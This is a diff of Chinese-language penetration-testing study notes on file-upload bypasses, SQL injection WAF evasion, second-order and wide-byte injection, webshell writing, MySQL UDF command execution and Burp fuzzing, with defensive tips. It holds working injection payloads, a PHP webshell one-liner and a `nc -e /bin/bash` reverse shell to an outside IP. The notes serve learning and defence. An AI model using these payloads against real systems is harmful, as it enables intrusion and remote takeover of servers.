@@ -57,7 +57,7 @@ windows下iis 5.x/6.0调用asp.dll解析文件，代码不够完善
 
 从右往左判断后缀，**跳过不可识别的后缀**，直到找到可识别的后缀，按照该可识别后缀进行解析
 
-例：访问上传的shell.php.test，服务器会解析成php文件
+**例**：访问上传的shell.php.test，服务器会解析成php文件
 
 ## 四、前端验证绕过
 
@@ -169,6 +169,40 @@ GIF: 47 49 46 38
 ---
 
 
+# 15. 文件上传：初探源码审计
+
+无法直接利用文件上传时，可看看能否先上传内容包含一句话的jpg，然后**联合使用本地/远程文件包含**
+
+* *php中`in_array`函数第三个参数值默认为`false`，即采用松散比较，故不指定第三个参数值时，`in_array(0, $纯字母的字符串数组)`返回`true`*
+
+---
+
+
+# 16. 文件上传：初探Fuzz
+
+## Fuzz/模糊测试
+
+自动或半自动生成大量随机数据输入程序，根据程序的反馈进行自动化或半自动化挖掘漏洞
+
+**注意**：
+1. 产生大量**异常输入**，可能造成生产环境崩溃
+2. 产生大量**负载**，可能影响生产环境运行
+3. 容易触发**安全警报**，为后续安全检测制造障碍。生产环境渗透和安全检测过程中不推荐fuzz，一般用于非生产环境或业务系统上线前
+
+**例**：文件上传中用bp来fuzz文件后缀名
+
+    在intruder模块用web server能解析的文件名字典对文件后缀名进行遍历，来看有没有能绕过过滤的后缀名，如用php3、php5等后缀字典来fuzz文件后缀名
+
+**结果判断**：服务器响应、WAF拦截、报错会返回各种状态码，可尝试通过**状态码**筛选正确的payload，或尝试根据**响应长度**或**匹配关键词**判断
+
+## 文件上传防御措施
+1. **文件类型**检测（白名单优于黑名单）
+2. 使用**安全的函数**
+3. 熟悉业务部署环境的**操作系统**、**web server配置**
+
+---
+
+
 # 22. SQL注入实战：判断SQL注入点&防御方式
 
 *TIPS:带参数的动态网页且该网页访问了数据库，就有可能存在SQL注入*
@@ -186,11 +220,15 @@ GIF: 47 49 46 38
 ### (1) 减少错误信息反馈
 ### (2) 对输入的特殊符号进行转义（黑名单机制）
 
-`\x00`		`\n`	`\r`	`\`	`'`	`"`	`\x1a`
+符号|符号|符号|符号|符号|符号|符号
+----|----|----|----|----|----|----
+`\x00`	|	`\n`	|`\r`	|`\`	|`'`	|`"`	|`\x1a`
 
 ### (3) 对输入的特殊词组进行过滤（黑名单机制）（PHP的`mysql_escape_string`）
 
-`and` `or` `union` `select` 空格
+词组|词组|词组|词组|词组
+----|----|----|----|----
+`and` |`or` |`union` |`select` |空格
 
 ---
 
@@ -235,6 +273,8 @@ union select user, password from users
 || (select user from users limit 1,1) = 'admin'
 ```
 
+通过`limit`筛选数据
+
 ## 四、`limit`过滤绕过
 
 原来的 
@@ -262,8 +302,12 @@ union select user, password from users
 
 替换成 
 ```sql
-|| select substr((select group_comcat(name)name from test), 1, 1) = 't'
+|| select substr((select group_concat(name)name from test), 1, 1) = 't'
 ```
+
+`group_concat`把整列数据连接起来然后`substr`逐字符判断
+
+* *查询语句的输出作函数参数时记得把语句括起来*
 
 ## 二、`select`及单引号过滤绕过
 
@@ -281,7 +325,7 @@ union select user, password from users
 || substr(name, 1, 1)=unhex(74)
 ```
 
-这里`||`的使用类似于布尔盲注，使用时可以不要`select`；
+这里`||`的使用类似于布尔盲注，使用时可以**不要`select`**；
 
 用**十六进制值**逐个字符进行判断就不需要引号了
 
@@ -329,5 +373,181 @@ select/**/name/**/from/**/test;
 1. SQL语句的同义变形体
 2. 利用WAF规则设定的缺陷（如双写）
 3. 利用技术链中间环节绕过（如编码）
+
+---
+
+
+# 38. SQL注入实战：如何绕过WAF之数据库底层编码注入
+
+绕过转义函数（**宽字节注入**）
+
+sqli-labs 36题
+
+PHP中`mysql_query("SET NAMES gbk")`设置后端采取GBK编码
+
+与这三句话效果等同：
+```sql
+SET character_set_client = x;
+SET character_set_results = x;
+SET character_set_results = x;
+```
+
+`SET`是动态设置参数，也可以通过my.ini/cnf进行静态设置
+
+GBK（GB扩）兼容并拓展了GB2312
+
+url编码：
+
+编码 | 字符
+-----|-----
+`%27`	|	`'`  
+`%23`	|	`#`  
+`%df`	|	无意义  
+`%5c`	|	`\`
+
+`%df`和转义函数插入的表示反斜杠的`%5c`结合成一个“`運`”字，后面的单引号就不会被反斜杠转义了
+
+---
+
+
+# 39. SQL注入实战：如何绕过WAF之二次注入
+
+**来自数据库的输入也不可信**
+
+sqli-labs 24题
+
+WAF记录IP、浏览器时也可能产生
+
+**例1**：
+1. 账号注册输入`admin'#`
+2. 防御机制：转义成`admin\'#`
+3. 实际存储内容：`admin'#`
+4. 修改密码等查询进行SQL语句调用
+    ```sql
+    where user='?' and password='?'
+    ```
+    变成
+    ```sql
+    where user='admin'#' and password='123'
+    ```
+
+输入的内容可能在后端拼接执行时被转义，却在存储时被反转义还原
+
+登录时传到后端的用户名被PHP的`mysql_real_escape_string`函数转义，难以注入，但注册用户`admin'#`成功
+
+修改密码时后端信任了从数据库取出的用户名，没有进行过滤，直接拼接成如下语句：
+
+```sql
+update users set password='456' where username='admin'#' and password='123';
+```
+发生了二次注入，直接修改了admin的密码为456
+
+## 防御
+
+1. 代码与数据分离：**预编译**（最推荐的方式，来自前后端的攻击皆可防御）
+2. 禁止用户账号出现特殊符号，或转义
+
+---
+
+
+# 40. SQL注入实战：命令执行
+
+## 一、写webshell
+
+注意`into outfile`的联合查询的**列数**也要和原来的一致
+
+**文件已存在**的话再写会报错
+
+`Errcode: 13`意为mysql用户没有该目录的**权限**
+
+## 二、UDF
+
+UDF文件获取：
+
+* [github.com/mysqludf/lib_mysqludf_sys](github.com/mysqludf/lib_mysqludf_sys)
+
+* sqlmap/data/udf/mysql/
+
+sqlmap下的文件经过编码，需要使用sqlmap/extra/cloak目录下的cloak.py进行解码
+
+```sh
+python cloak.py -d -i /Users/apple/workplace/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so
+```
+
+---
+
+
+# 41. SQL注入实战：webshell类型命令执行与交互
+
+## 反弹shell
+
+### 客户端：
+
+```sh
+nc -l 8888
+```
+
+**监听**8888端口
+
+### 服务端：
+
+1. `into outfile`写入一句话`system($_GET['cmd']`到images/cmd.php
+2. 在浏览器访问domain/images/cmd/php?cmd=nc -e /bin/bash 192.168.0.98 333，使服务器**连接**客户端192.168.0.98的端口333，连接成功后执行`/bin/bash`
+
+---
+
+
+# 42. SQL注入实战：UDF类型命令执行与交互
+
+## UDF
+
+```sql
+select unhex('UDF库文件二进制内容的十六进制') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so'
+```
+
+要有**写文件权限**
+
+* `into outfile`会在行末写入新行、转义换行符，二进制可执行文件内容会被破坏
+* `into dumpfile` 不对任何列或行进行终止、不执行任何转义，能导出完整可执行的二进制文件
+
+故写udf库这种二进制可执行文件要用`dumpfile`
+
+写入UDF库文件后，创建函数：
+
+```sql
+create functon sys_eval returns string soname "lib_linux.so"
+```
+
+SQLMap提供参数进行命令执行和shell获取
+
+```sh
+sqlmap.py -u "url" --os-shell
+sqlmap.py -u "url" --os-cmd=ipconfig
+```
+
+## SQL注入命令执行防御
+
+除了对**SQL注入本身**的检测之外：
+1. 服务器**文件夹**的权限管理
+2. 以最小权限应用**服务**，如apache服务
+
+---
+
+
+# 50. SQL注入实战：自动化注入之FuzzDB+Burp组合拳
+
+**fuzzdb**：github上的开源应用程序模糊测试数据库，包含各种payload
+
+包含命令执行、目录遍历、文件上传绕过、xss、sql注入等，还有webshell、字典
+
+bp爆破模式：
+* sniper：狙击手，使用单一词典，每次仅变更一个参数。如有两参数，先保持第二个参数不变、遍历第一个参数，然后保存第一个参数不变、遍历第二个参数
+* 攻城锤：使用单一词典，多个变量同时变更为同一值
+* 音叉：每个变量一个词典，三个变量同时改变
+* 集束炸弹：笛卡尔积，每个变量与另一个变量所有情况的组合都测试到，多个字典情况下测试时间非常漫长
+
+
+***//未完待xu***
+
 
 ![公众号二维码](https://neptliang.github.io/img/Article/WeChatBlog.png)
